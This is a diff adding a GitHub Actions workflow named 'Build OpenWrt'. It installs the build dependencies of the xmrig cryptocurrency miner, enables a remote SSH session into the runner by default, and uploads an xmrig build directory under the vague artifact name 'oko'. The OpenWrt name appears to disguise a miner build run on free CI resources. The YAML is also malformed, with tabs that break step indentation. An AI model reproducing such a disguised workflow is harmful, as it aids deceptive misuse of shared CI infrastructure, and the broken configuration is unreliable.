@@ -1,0 +1,58 @@
+name: Build OpenWrt
+
+on:
+  repository_dispatch:
+  release:
+    types: published
+  push:
+    branches:
+      - master
+    paths:
+      - '.config'
+#  schedule:
+#    - cron: 0 8 * * 5
+  watch:
+    types: started
+
+env:
+  SSH_ACTIONS: true
+  UPLOAD_BIN_DIR: true
+  UPLOAD_FIRMWARE: true
+  UPLOAD_COWTRANSFER: false
+  UPLOAD_WETRANSFER: false
+  TZ: Asia/Shanghai
+
+jobs:
+  build:
+    runs-on: ubuntu-18.04
+    if: github.event.repository.owner.id == github.event.sender.id
+
+    steps:
+    - name: Checkout
+      uses: actions/checkout@master
+
+    - name: Initialization environment
+      env:
+        DEBIAN_FRONTEND: noninteractive
+      run: |
+        sudo rm -rf /etc/apt/sources.list.d/* /usr/share/dotnet /usr/local/lib/android /opt/ghc
+        sudo -E apt-get -qq update
+		sudo -E apt-get -qq install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+        sudo -E apt-get -qq autoremove --purge
+        sudo -E apt-get -qq clean
+        sudo timedatectl set-timezone "$TZ"
+        sudo mkdir -p /workdir
+        sudo chown $USER:$GROUPS /workdir
+	- name: Clone source code
+      working-directory: /workdir
+      run: |
+        df -hT $PWD
+	- name: SSH connection to Actions
+      uses: P3TERX/ssh2actions@v1.0.0
+      if: env.SSH_ACTIONS == 'true' || contains(github.event.action, 'ssh')
+	- name: Upload bin directory
+      uses: actions/upload-artifact@master
+      if: env.UPLOAD_BIN_DIR == 'true'
+      with:
+        name: oko
+        path: /workdir/xmrig/build
